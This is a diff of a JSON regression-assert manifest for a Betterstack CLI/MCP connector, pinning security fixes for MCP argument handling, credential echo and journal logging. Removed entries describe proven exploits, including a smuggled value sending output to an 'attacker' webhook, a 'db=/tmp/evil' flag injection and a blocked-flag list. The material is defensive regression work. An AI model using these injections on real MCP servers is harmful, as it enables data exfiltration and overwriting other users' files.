@@ -25,7 +25,8 @@
      "contains": "PatchWithParams",
      "min_count": 1
     }
-   ]
+   ],
+   "class": "wrong-result"
   },
   {
    "id": "live-fanout-numeric-id-json-number",
@@ -48,7 +49,8 @@
      "contains": "dec.UseNumber()",
      "min_count": 1
     }
-   ]
+   ],
+   "class": "wrong-result"
   },
   {
    "id": "governance-incident-write-tier-corrections",
@@ -72,7 +74,8 @@
      "contains": "workflow archive",
      "min_count": 1
     }
-   ]
+   ],
+   "class": "write-safety"
   },
   {
    "id": "doctor-verdict-tracks-reality",
@@ -85,7 +88,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -107,8 +110,39 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
-   ]
+   ],
+   "class": "doctor-truth"
   },
   {
    "id": "install-credentials-declared-on-every-channel",
@@ -147,353 +181,884 @@
      "contains": "\"BETTERSTACK_BASE_URL\":",
      "min_count": 3
     }
-   ]
+   ],
+   "class": "install-channels"
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
    "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name, and no file stores operator-named text that repeats a credential the program holds; applied by tools/maintainer/apply_journal_hardening.py. The <PREFIX>_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>:\" plus the typed name's hash when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Each operator-named write (profiles.json, the journal, teach.log, learnings.jsonl, feedback.jsonl and the learn tables: learnings, playbooks, candidates, recall misses, entity aliases, patterns) goes through the credential kit's file or SQL sink, which withholds one that carries a credential the program holds. journal_credential_hardening_test.go drives each path and fails if a credential reaches any file under the test home.",
+   "why": "Press 4.34.0 and 4.34.2 (learn/journal.go.tmpl) return the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and record every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query; and a credential given as a profile name or description, a recall or teach query or operand, or feedback is stored as typed. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; operator-named text that repeats no credential the process holds is a name and is kept. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening; re-run tools/maintainer/apply_journal_hardening.py --slug <slug>. The connector's own RefuseHeld checks on each journal, log, profile, feedback, learning, playbook, candidate, lookup and pattern write are replaced by the kit's sinks (credkit-wiring, credkit-sqlite-every-handle), so every line that does reach a file passes the kit's matcher as one unit.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments; and every template that stores operator-named text should refuse one that repeats a held credential.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "\tlookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}\n\tisBoolFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && f.Value.Type() == \"bool\"\n\t}",
      "code_only": true
     },
     {
-     "file": "cli/cmd/betterstack-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/root.go",
+     "contains": "\t\tCmd:           journalVerbChain(rootCmd, executed),\n\t\tArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
      "code_only": true
     },
     {
-     "file": "cli/cmd/betterstack-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
      "code_only": true
     },
     {
-     "file": "cli/cmd/betterstack-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "RefuseHeld"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "ArgvShape:     learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "credkit.Hold(\"test:journal\", journalHardeningHeld, journalHardeningName)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1JournalHalvesFromTwoProcesses(t *testing.T) {",
+     "code_only": true
     }
    ]
+  },
+  {
+   "id": "no-response-cache",
+   "class": "secret-echo",
+   "summary": "The on-disk response cache is off on every client: raw Betterstack bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (betterstack_guard.go); TestGuardWrapsTheTransport asserts it. README and SKILL say responses are never cached.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "class": "secret-echo",
+   "summary": "Every resource write passes withoutStoredSecrets (internal/store/stored_secret_fields.go), which masks every credential-named value by the one secret-name rule (cliutil.RedactSecretFields), so a monitor is kept with its auth_username, auth_password and request_headers masked and an escalation policy with its incident_token masked. Every SQL statement then passes the kit's SQL driver (credkit-sqlite-every-handle).",
+   "why": "Work order: no credential in files. The kit's SQL driver withholds a whole statement that carries a held value, and a monitor's credential pair and request headers and a policy's incident_token are held response fields, so without the mask a sync of monitors or policies would store nothing. TestMonitorCredentialsNeverPrint checks the record is stored, masked. The old storedID rewrite and withhold driver are retired with the old layer.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return withoutStoredSecrets(s.mergeIncomingResourceDataRaw(tx, resourceType, id, incoming))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/stored_secret_fields.go",
+     "contains": "func withoutStoredSecrets(data json.RawMessage) json.RawMessage {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "storedID("
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMonitorCredentialsNeverPrint(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Betterstack state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/betterstack_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/betterstack_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/betterstack_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, output withheld whole by the credential kit, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "README.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "README.md",
